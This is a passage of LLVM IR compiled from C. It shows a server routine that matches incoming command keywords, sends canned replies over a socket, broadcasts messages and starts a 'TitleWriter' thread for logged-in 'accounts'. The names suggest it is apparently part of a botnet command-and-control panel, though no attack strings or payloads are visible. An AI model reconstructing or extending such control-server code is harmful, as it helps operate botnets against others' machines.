  %606 = call i32 (i8*, i8*, ...) @sprintf(i8* %600, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %605) #9
  %607 = load i32, i32* %4, align 4
  %608 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %609 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %610 = call i64 @strlen(i8* %609) #8
  %611 = call i64 @send(i32 %607, i8* %608, i64 %610, i32 16384)
  %612 = icmp eq i64 %611, -1
  br i1 %612, label %613, label %614

613:                                              ; preds = %597
  br label %1075

614:                                              ; preds = %597
  br label %428, !llvm.loop !19

615:                                              ; preds = %491
  %616 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %617 = call i8* @strstr(i8* %616, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.49, i64 0, i64 0)) #8
  %618 = icmp ne i8* %617, null
  br i1 %618, label %619, label %626

619:                                              ; preds = %615
  %620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %620, i8 0, i64 2048, i1 false)
  %621 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  %622 = call i32 (i8*, i8*, ...) @sprintf(i8* %621, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.50, i64 0, i64 0)) #9
  %623 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %624 = load i32, i32* %4, align 4
  %625 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  call void @broadcast(i8* %623, i32 %624, i8* %625)
  br label %428, !llvm.loop !19

626:                                              ; preds = %615
  %627 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %628 = call i8* @strstr(i8* %627, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i64 0, i64 0)) #8
  %629 = icmp ne i8* %628, null
  br i1 %629, label %630, label %661

630:                                              ; preds = %626
  %631 = getelementptr inbounds [2048 x i8], [2048 x i8]* %51, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %631, i8 0, i64 2048, i1 false)
  %632 = getelementptr inbounds [2048 x i8], [2048 x i8]* %51, i64 0, i64 0
  %633 = call i32 (i8*, i8*, ...) @sprintf(i8* %632, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.52, i64 0, i64 0)) #9
  %634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %51, i64 0, i64 0
  %635 = load i32, i32* %4, align 4
  call void @broadcast(i8* %634, i32 %635, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i64 0, i64 0))
  %636 = load i32, i32* %4, align 4
  %637 = getelementptr inbounds [2048 x i8], [2048 x i8]* %51, i64 0, i64 0
  %638 = getelementptr inbounds [2048 x i8], [2048 x i8]* %51, i64 0, i64 0
  %639 = call i64 @strlen(i8* %638) #8
  %640 = call i64 @send(i32 %636, i8* %637, i64 %639, i32 16384)
  %641 = icmp eq i64 %640, -1
  br i1 %641, label %642, label %643

642:                                              ; preds = %630
  br label %1075

643:                                              ; preds = %630
  br label %644

644:                                              ; preds = %643
  %645 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %647
  %649 = getelementptr inbounds %struct.login_info, %struct.login_info* %648, i32 0, i32 0
  %650 = getelementptr inbounds [100 x i8], [100 x i8]* %649, i64 0, i64 0
  %651 = call i32 (i8*, i8*, ...) @sprintf(i8* %645, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %650) #9
  %652 = load i32, i32* %4, align 4
  %653 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %654 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i64 0, i64 0
  %655 = call i64 @strlen(i8* %654) #8
  %656 = call i64 @send(i32 %652, i8* %653, i64 %655, i32 16384)
  %657 = icmp eq i64 %656, -1
  br i1 %657, label %658, label %659

658:                                              ; preds = %644
  br label %1075

659:                                              ; preds = %644
  br label %660

660:                                              ; preds = %659
  br label %428, !llvm.loop !19

661:                                              ; preds = %626
  %662 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %663 = call i8* @strstr(i8* %662, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0)) #8
  %664 = icmp ne i8* %663, null
  br i1 %664, label %665, label %758

665:                                              ; preds = %661
  %666 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %666, i8 0, i64 2048, i1 false)
  %667 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  %668 = call i32 (i8*, i8*, ...) @sprintf(i8* %667, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.55, i64 0, i64 0)) #9
  %669 = load i32, i32* %4, align 4
  %670 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  %671 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i64 0, i64 0
  %672 = call i64 @strlen(i8* %671) #8
  %673 = call i64 @send(i32 %669, i8* %670, i64 %672, i32 16384)
  %674 = icmp eq i64 %673, -1
  br i1 %674, label %675, label %676

675:                                              ; preds = %665
  br label %1075

676:                                              ; preds = %665
  %677 = load i32, i32* %4, align 4
  %678 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %679 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %680 = call i64 @strlen(i8* %679) #8
  %681 = call i64 @send(i32 %677, i8* %678, i64 %680, i32 16384)
  %682 = icmp eq i64 %681, -1
  br i1 %682, label %683, label %684

683:                                              ; preds = %676
  br label %1075

684:                                              ; preds = %676
  %685 = load i32, i32* %4, align 4
  %686 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %687 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %688 = call i64 @strlen(i8* %687) #8
  %689 = call i64 @send(i32 %685, i8* %686, i64 %688, i32 16384)
  %690 = icmp eq i64 %689, -1
  br i1 %690, label %691, label %692

691:                                              ; preds = %684
  br label %1075

692:                                              ; preds = %684
  %693 = load i32, i32* %4, align 4
  %694 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %695 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %696 = call i64 @strlen(i8* %695) #8
  %697 = call i64 @send(i32 %693, i8* %694, i64 %696, i32 16384)
  %698 = icmp eq i64 %697, -1
  br i1 %698, label %699, label %700

699:                                              ; preds = %692
  br label %1075

700:                                              ; preds = %692
  %701 = load i32, i32* %4, align 4
  %702 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %703 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %704 = call i64 @strlen(i8* %703) #8
  %705 = call i64 @send(i32 %701, i8* %702, i64 %704, i32 16384)
  %706 = icmp eq i64 %705, -1
  br i1 %706, label %707, label %708

707:                                              ; preds = %700
  br label %1075

708:                                              ; preds = %700
  %709 = load i32, i32* %4, align 4
  %710 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %711 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %712 = call i64 @strlen(i8* %711) #8
  %713 = call i64 @send(i32 %709, i8* %710, i64 %712, i32 16384)
  %714 = icmp eq i64 %713, -1
  br i1 %714, label %715, label %716

715:                                              ; preds = %708
  br label %1075

716:                                              ; preds = %708
  %717 = load i32, i32* %4, align 4
  %718 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %719 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %720 = call i64 @strlen(i8* %719) #8
  %721 = call i64 @send(i32 %717, i8* %718, i64 %720, i32 16384)
  %722 = icmp eq i64 %721, -1
  br i1 %722, label %723, label %724

723:                                              ; preds = %716
  br label %1075

724:                                              ; preds = %716
  %725 = load i32, i32* %4, align 4
  %726 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %727 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %728 = call i64 @strlen(i8* %727) #8
  %729 = call i64 @send(i32 %725, i8* %726, i64 %728, i32 16384)
  %730 = icmp eq i64 %729, -1
  br i1 %730, label %731, label %732

731:                                              ; preds = %724
  br label %1075

732:                                              ; preds = %724
  %733 = load i32, i32* %4, align 4
  %734 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %735 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %736 = call i64 @strlen(i8* %735) #8
  %737 = call i64 @send(i32 %733, i8* %734, i64 %736, i32 16384)
  %738 = icmp eq i64 %737, -1
  br i1 %738, label %739, label %740

739:                                              ; preds = %732
  br label %1075

740:                                              ; preds = %732
  br label %741

741:                                              ; preds = %740
  %742 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %743 = load i32, i32* %5, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %744
  %746 = getelementptr inbounds %struct.login_info, %struct.login_info* %745, i32 0, i32 0
  %747 = getelementptr inbounds [100 x i8], [100 x i8]* %746, i64 0, i64 0
  %748 = call i32 (i8*, i8*, ...) @sprintf(i8* %742, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %747) #9
  %749 = load i32, i32* %4, align 4
  %750 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %751 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i64 0, i64 0
  %752 = call i64 @strlen(i8* %751) #8
  %753 = call i64 @send(i32 %749, i8* %750, i64 %752, i32 16384)
  %754 = icmp eq i64 %753, -1
  br i1 %754, label %755, label %756

755:                                              ; preds = %741
  br label %1075

756:                                              ; preds = %741
  br label %757

757:                                              ; preds = %756
  br label %428, !llvm.loop !19

758:                                              ; preds = %661
  %759 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %760 = call i8* @strstr(i8* %759, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.56, i64 0, i64 0)) #8
  %761 = icmp ne i8* %760, null
  br i1 %761, label %762, label %855

762:                                              ; preds = %758
  %763 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %763, i8 0, i64 2048, i1 false)
  %764 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %765 = call i32 (i8*, i8*, ...) @sprintf(i8* %764, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.55, i64 0, i64 0)) #9
  %766 = load i32, i32* %4, align 4
  %767 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %768 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %769 = call i64 @strlen(i8* %768) #8
  %770 = call i64 @send(i32 %766, i8* %767, i64 %769, i32 16384)
  %771 = icmp eq i64 %770, -1
  br i1 %771, label %772, label %773

772:                                              ; preds = %762
  br label %1075

773:                                              ; preds = %762
  %774 = load i32, i32* %4, align 4
  %775 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %776 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %777 = call i64 @strlen(i8* %776) #8
  %778 = call i64 @send(i32 %774, i8* %775, i64 %777, i32 16384)
  %779 = icmp eq i64 %778, -1
  br i1 %779, label %780, label %781

780:                                              ; preds = %773
  br label %1075

781:                                              ; preds = %773
  %782 = load i32, i32* %4, align 4
  %783 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %784 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %785 = call i64 @strlen(i8* %784) #8
  %786 = call i64 @send(i32 %782, i8* %783, i64 %785, i32 16384)
  %787 = icmp eq i64 %786, -1
  br i1 %787, label %788, label %789

788:                                              ; preds = %781
  br label %1075

789:                                              ; preds = %781
  %790 = load i32, i32* %4, align 4
  %791 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %792 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %793 = call i64 @strlen(i8* %792) #8
  %794 = call i64 @send(i32 %790, i8* %791, i64 %793, i32 16384)
  %795 = icmp eq i64 %794, -1
  br i1 %795, label %796, label %797

796:                                              ; preds = %789
  br label %1075

797:                                              ; preds = %789
  %798 = load i32, i32* %4, align 4
  %799 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %800 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %801 = call i64 @strlen(i8* %800) #8
  %802 = call i64 @send(i32 %798, i8* %799, i64 %801, i32 16384)
  %803 = icmp eq i64 %802, -1
  br i1 %803, label %804, label %805

804:                                              ; preds = %797
  br label %1075

805:                                              ; preds = %797
  %806 = load i32, i32* %4, align 4
  %807 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %808 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %809 = call i64 @strlen(i8* %808) #8
  %810 = call i64 @send(i32 %806, i8* %807, i64 %809, i32 16384)
  %811 = icmp eq i64 %810, -1
  br i1 %811, label %812, label %813

812:                                              ; preds = %805
  br label %1075

813:                                              ; preds = %805
  %814 = load i32, i32* %4, align 4
  %815 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %816 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %817 = call i64 @strlen(i8* %816) #8
  %818 = call i64 @send(i32 %814, i8* %815, i64 %817, i32 16384)
  %819 = icmp eq i64 %818, -1
  br i1 %819, label %820, label %821

820:                                              ; preds = %813
  br label %1075

821:                                              ; preds = %813
  %822 = load i32, i32* %4, align 4
  %823 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %824 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %825 = call i64 @strlen(i8* %824) #8
  %826 = call i64 @send(i32 %822, i8* %823, i64 %825, i32 16384)
  %827 = icmp eq i64 %826, -1
  br i1 %827, label %828, label %829

828:                                              ; preds = %821
  br label %1075

829:                                              ; preds = %821
  %830 = load i32, i32* %4, align 4
  %831 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %832 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %833 = call i64 @strlen(i8* %832) #8
  %834 = call i64 @send(i32 %830, i8* %831, i64 %833, i32 16384)
  %835 = icmp eq i64 %834, -1
  br i1 %835, label %836, label %837

836:                                              ; preds = %829
  br label %1075

837:                                              ; preds = %829
  br label %838

838:                                              ; preds = %837
  %839 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %840 = load i32, i32* %5, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %841
  %843 = getelementptr inbounds %struct.login_info, %struct.login_info* %842, i32 0, i32 0
  %844 = getelementptr inbounds [100 x i8], [100 x i8]* %843, i64 0, i64 0
  %845 = call i32 (i8*, i8*, ...) @sprintf(i8* %839, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %844) #9
  %846 = load i32, i32* %4, align 4
  %847 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %848 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i64 0, i64 0
  %849 = call i64 @strlen(i8* %848) #8
  %850 = call i64 @send(i32 %846, i8* %847, i64 %849, i32 16384)
  %851 = icmp eq i64 %850, -1
  br i1 %851, label %852, label %853

852:                                              ; preds = %838
  br label %1075

853:                                              ; preds = %838
  br label %854

854:                                              ; preds = %853
  br label %428, !llvm.loop !19

855:                                              ; preds = %758
  %856 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %857 = call i8* @strstr(i8* %856, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i64 0, i64 0)) #8
  %858 = icmp ne i8* %857, null
  br i1 %858, label %859, label %952

859:                                              ; preds = %855
  %860 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %860, i8 0, i64 2048, i1 false)
  %861 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %862 = call i32 (i8*, i8*, ...) @sprintf(i8* %861, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.55, i64 0, i64 0)) #9
  %863 = load i32, i32* %4, align 4
  %864 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %865 = getelementptr inbounds [2048 x i8], [2048 x i8]* %58, i64 0, i64 0
  %866 = call i64 @strlen(i8* %865) #8
  %867 = call i64 @send(i32 %863, i8* %864, i64 %866, i32 16384)
  %868 = icmp eq i64 %867, -1
  br i1 %868, label %869, label %870

869:                                              ; preds = %859
  br label %1075

870:                                              ; preds = %859
  %871 = load i32, i32* %4, align 4
  %872 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %873 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %874 = call i64 @strlen(i8* %873) #8
  %875 = call i64 @send(i32 %871, i8* %872, i64 %874, i32 16384)
  %876 = icmp eq i64 %875, -1
  br i1 %876, label %877, label %878

877:                                              ; preds = %870
  br label %1075

878:                                              ; preds = %870
  %879 = load i32, i32* %4, align 4
  %880 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %881 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %882 = call i64 @strlen(i8* %881) #8
  %883 = call i64 @send(i32 %879, i8* %880, i64 %882, i32 16384)
  %884 = icmp eq i64 %883, -1
  br i1 %884, label %885, label %886

885:                                              ; preds = %878
  br label %1075

886:                                              ; preds = %878
  %887 = load i32, i32* %4, align 4
  %888 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %889 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %890 = call i64 @strlen(i8* %889) #8
  %891 = call i64 @send(i32 %887, i8* %888, i64 %890, i32 16384)
  %892 = icmp eq i64 %891, -1
  br i1 %892, label %893, label %894

893:                                              ; preds = %886
  br label %1075

894:                                              ; preds = %886
  %895 = load i32, i32* %4, align 4
  %896 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %897 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %898 = call i64 @strlen(i8* %897) #8
  %899 = call i64 @send(i32 %895, i8* %896, i64 %898, i32 16384)
  %900 = icmp eq i64 %899, -1
  br i1 %900, label %901, label %902

901:                                              ; preds = %894
  br label %1075

902:                                              ; preds = %894
  %903 = load i32, i32* %4, align 4
  %904 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %905 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %906 = call i64 @strlen(i8* %905) #8
  %907 = call i64 @send(i32 %903, i8* %904, i64 %906, i32 16384)
  %908 = icmp eq i64 %907, -1
  br i1 %908, label %909, label %910

909:                                              ; preds = %902
  br label %1075

910:                                              ; preds = %902
  %911 = load i32, i32* %4, align 4
  %912 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %913 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %914 = call i64 @strlen(i8* %913) #8
  %915 = call i64 @send(i32 %911, i8* %912, i64 %914, i32 16384)
  %916 = icmp eq i64 %915, -1
  br i1 %916, label %917, label %918

917:                                              ; preds = %910
  br label %1075

918:                                              ; preds = %910
  %919 = load i32, i32* %4, align 4
  %920 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %921 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %922 = call i64 @strlen(i8* %921) #8
  %923 = call i64 @send(i32 %919, i8* %920, i64 %922, i32 16384)
  %924 = icmp eq i64 %923, -1
  br i1 %924, label %925, label %926

925:                                              ; preds = %918
  br label %1075

926:                                              ; preds = %918
  %927 = load i32, i32* %4, align 4
  %928 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %929 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %930 = call i64 @strlen(i8* %929) #8
  %931 = call i64 @send(i32 %927, i8* %928, i64 %930, i32 16384)
  %932 = icmp eq i64 %931, -1
  br i1 %932, label %933, label %934

933:                                              ; preds = %926
  br label %1075

934:                                              ; preds = %926
  br label %935

935:                                              ; preds = %934
  %936 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i64 0, i64 0
  %937 = load i32, i32* %5, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %938
  %940 = getelementptr inbounds %struct.login_info, %struct.login_info* %939, i32 0, i32 0
  %941 = getelementptr inbounds [100 x i8], [100 x i8]* %940, i64 0, i64 0
  %942 = call i32 (i8*, i8*, ...) @sprintf(i8* %936, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %941) #9
  %943 = load i32, i32* %4, align 4
  %944 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i64 0, i64 0
  %945 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i64 0, i64 0
  %946 = call i64 @strlen(i8* %945) #8
  %947 = call i64 @send(i32 %943, i8* %944, i64 %946, i32 16384)
  %948 = icmp eq i64 %947, -1
  br i1 %948, label %949, label %950

949:                                              ; preds = %935
  br label %1075

950:                                              ; preds = %935
  br label %951

951:                                              ; preds = %950
  br label %428, !llvm.loop !19

952:                                              ; preds = %855
  %953 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %954 = call i8* @strstr(i8* %953, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.58, i64 0, i64 0)) #8
  %955 = icmp ne i8* %954, null
  br i1 %955, label %956, label %1020

956:                                              ; preds = %952
  %957 = load i8*, i8** %3, align 8
  %958 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %957) #9
  %959 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i64 0, i64 0
  %960 = call i32 (i8*, i8*, ...) @sprintf(i8* %959, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.59, i64 0, i64 0)) #9
  %961 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  %962 = call i32 (i8*, i8*, ...) @sprintf(i8* %961, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.60, i64 0, i64 0)) #9
  %963 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %964 = call i32 (i8*, i8*, ...) @sprintf(i8* %963, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.61, i64 0, i64 0)) #9
  %965 = getelementptr inbounds [2048 x i8], [2048 x i8]* %63, i64 0, i64 0
  %966 = call i32 (i8*, i8*, ...) @sprintf(i8* %965, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.62, i64 0, i64 0)) #9
  %967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  %968 = call i32 (i8*, i8*, ...) @sprintf(i8* %967, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.63, i64 0, i64 0)) #9
  %969 = getelementptr inbounds [2048 x i8], [2048 x i8]* %65, i64 0, i64 0
  %970 = call i32 (i8*, i8*, ...) @sprintf(i8* %969, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.64, i64 0, i64 0)) #9
  %971 = load i32, i32* %4, align 4
  %972 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i64 0, i64 0
  %973 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i64 0, i64 0
  %974 = call i64 @strlen(i8* %973) #8
  %975 = call i64 @send(i32 %971, i8* %972, i64 %974, i32 16384)
  %976 = icmp eq i64 %975, -1
  br i1 %976, label %977, label %978

977:                                              ; preds = %956
  br label %1075

978:                                              ; preds = %956
  %979 = load i32, i32* %4, align 4
  %980 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  %981 = getelementptr inbounds [2048 x i8], [2048 x i8]* %61, i64 0, i64 0
  %982 = call i64 @strlen(i8* %981) #8
  %983 = call i64 @send(i32 %979, i8* %980, i64 %982, i32 16384)
  %984 = icmp eq i64 %983, -1
  br i1 %984, label %985, label %986

985:                                              ; preds = %978
  br label %1075

986:                                              ; preds = %978
  %987 = load i32, i32* %4, align 4
  %988 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %989 = getelementptr inbounds [2048 x i8], [2048 x i8]* %62, i64 0, i64 0
  %990 = call i64 @strlen(i8* %989) #8
  %991 = call i64 @send(i32 %987, i8* %988, i64 %990, i32 16384)
  %992 = icmp eq i64 %991, -1
  br i1 %992, label %993, label %994

993:                                              ; preds = %986
  br label %1075

994:                                              ; preds = %986
  %995 = load i32, i32* %4, align 4
  %996 = getelementptr inbounds [2048 x i8], [2048 x i8]* %63, i64 0, i64 0
  %997 = getelementptr inbounds [2048 x i8], [2048 x i8]* %63, i64 0, i64 0
  %998 = call i64 @strlen(i8* %997) #8
  %999 = call i64 @send(i32 %995, i8* %996, i64 %998, i32 16384)
  %1000 = icmp eq i64 %999, -1
  br i1 %1000, label %1001, label %1002

1001:                                             ; preds = %994
  br label %1075

1002:                                             ; preds = %994
  %1003 = load i32, i32* %4, align 4
  %1004 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  %1005 = getelementptr inbounds [2048 x i8], [2048 x i8]* %64, i64 0, i64 0
  %1006 = call i64 @strlen(i8* %1005) #8
  %1007 = call i64 @send(i32 %1003, i8* %1004, i64 %1006, i32 16384)
  %1008 = icmp eq i64 %1007, -1
  br i1 %1008, label %1009, label %1010

1009:                                             ; preds = %1002
  br label %1075

1010:                                             ; preds = %1002
  %1011 = load i32, i32* %4, align 4
  %1012 = getelementptr inbounds [2048 x i8], [2048 x i8]* %65, i64 0, i64 0
  %1013 = getelementptr inbounds [2048 x i8], [2048 x i8]* %65, i64 0, i64 0
  %1014 = call i64 @strlen(i8* %1013) #8
  %1015 = call i64 @send(i32 %1011, i8* %1012, i64 %1014, i32 16384)
  %1016 = icmp eq i64 %1015, -1
  br i1 %1016, label %1017, label %1018

1017:                                             ; preds = %1010
  br label %1075

1018:                                             ; preds = %1010
  %1019 = call i32 @sleep(i32 5)
  br label %1075

1020:                                             ; preds = %952
  %1021 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %1021)
  %1022 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i64 0, i64 0
  %1023 = load i32, i32* %5, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %1024
  %1026 = getelementptr inbounds %struct.login_info, %struct.login_info* %1025, i32 0, i32 0
  %1027 = getelementptr inbounds [100 x i8], [100 x i8]* %1026, i64 0, i64 0
  %1028 = call i32 (i8*, i8*, ...) @sprintf(i8* %1022, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.33, i64 0, i64 0), i8* %1027) #9
  %1029 = load i32, i32* %4, align 4
  %1030 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i64 0, i64 0
  %1031 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i64 0, i64 0
  %1032 = call i64 @strlen(i8* %1031) #8
  %1033 = call i64 @send(i32 %1029, i8* %1030, i64 %1032, i32 16384)
  %1034 = icmp eq i64 %1033, -1
  br i1 %1034, label %1035, label %1036

1035:                                             ; preds = %1020
  br label %1075

1036:                                             ; preds = %1020
  %1037 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1038 = call i64 @strlen(i8* %1037) #8
  %1039 = icmp eq i64 %1038, 0
  br i1 %1039, label %1040, label %1041

1040:                                             ; preds = %1036
  br label %428, !llvm.loop !19

1041:                                             ; preds = %1036
  %1042 = load i32, i32* %5, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %1043
  %1045 = getelementptr inbounds %struct.login_info, %struct.login_info* %1044, i32 0, i32 0
  %1046 = getelementptr inbounds [100 x i8], [100 x i8]* %1045, i64 0, i64 0
